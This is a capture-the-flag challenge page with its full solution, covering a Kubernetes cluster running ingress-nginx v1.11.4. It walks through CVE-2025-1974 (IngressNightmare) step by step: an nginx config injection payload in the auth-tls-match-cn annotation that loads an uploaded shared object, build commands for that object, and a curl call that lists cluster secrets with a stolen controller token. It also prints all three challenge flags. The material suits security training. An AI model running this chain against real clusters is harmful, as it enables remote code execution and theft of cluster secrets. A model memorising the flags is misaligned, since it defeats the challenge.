# Sealed

**Category:** cloud  **Difficulty:** insane  **Author:** abu

> You have low-privilege access to a Kubernetes cluster running a familiar
> ingress controller. Rumor has it someone forgot to lock the janitor's closet.
>
> Your foothold: a kubeconfig for a restricted ServiceAccount inside the cluster.
> Every pod in this cluster can reach every Service - including the ones that
> are supposed to be internal.
>
> Find all the secrets.

Deploy: one k3s cluster per team inside a sysbox pod, with ingress-nginx pinned to v1.11.4. Start k3s with `--disable traefik`, install ingress-nginx v1.11.4, set `worker-processes: "1"` and `http-snippet: "client_body_in_file_only on;"` in the controller ConfigMap, create a self-signed TLS secret `calico-system/node-certs`, then run `challenge/setup/setup.sh`. It writes the player kubeconfig to `/tmp/player-kubeconfig.yaml`.

## Solution

The controller is ingress-nginx v1.11.4, which is vulnerable to CVE-2025-1974 (IngressNightmare). The admission webhook is reachable without auth from any pod.

**Recon.** The player SA can read configmaps cluster-wide:

```sh
kubectl get configmap -n ingress-nginx cluster-info -o yaml
```

Flag 1 is in `data.flag`, and `data.tls-secret` points at `calico-system/node-certs`, which we need for the `auth-tls-secret` annotation later.

**RCE.** When the webhook validates an Ingress it renders an nginx config and runs `nginx -t`. The `auth-tls-match-cn` annotation goes into that config as-is, so we can close the blocks and inject a directive at the main level. `ssl_engine` takes a path and `dlopen`s it, which runs our constructor.

To get a `.so` onto the controller's disk, POST it as a request body to nginx on the NodePort (30110). With `client_body_in_file_only on` nginx keeps the body under `/tmp/nginx/client-body/`. List the directory before and after the upload to find your file. The `/proc/<pid>/fd/<n>` trick does not work here: the worker runs with `NoNewPrivs`, which makes it non-dumpable.

Then send an AdmissionReview to `ingress-nginx-controller-admission.ingress-nginx.svc:443` with:

```
CN=abc #(
){} }}
ssl_engine ../../../../../../tmp/nginx/client-body/XXXXXXXXXX;
#
```

`engine.c` reads `/run/secrets/sealed/flag` and the controller's SA token and writes both to `/tmp/rce_proof`. The `nginx -t` output comes back in the AdmissionReview `status.message`. Build it for musl:

```sh
docker run --rm -v $PWD:/build alpine:3.19 \
  sh -c 'apk add gcc musl-dev; gcc -shared -fPIC -nostartfiles -o /build/engine.so /build/engine.c'
```

**Secrets.** The controller SA has `secrets: list` cluster-wide (stock ingress-nginx RBAC). Use the stolen token against the API server:

```sh
curl -sk -H "Authorization: Bearer $TOKEN" https://<apiserver>:6443/api/v1/namespaces/vault/secrets
```

`crown-jewels` has flag 3, base64 encoded.

The full chain is in `challenge/exploit/exploit.py` (needs `engine.so` built and the admission service port-forwarded).

Flags: `H7CTF{unauthenticated_webhook_attack_surface}`, `H7CTF{rce_as_controller_service_account}`, `H7CTF{cluster_wide_secret_theft_complete}`
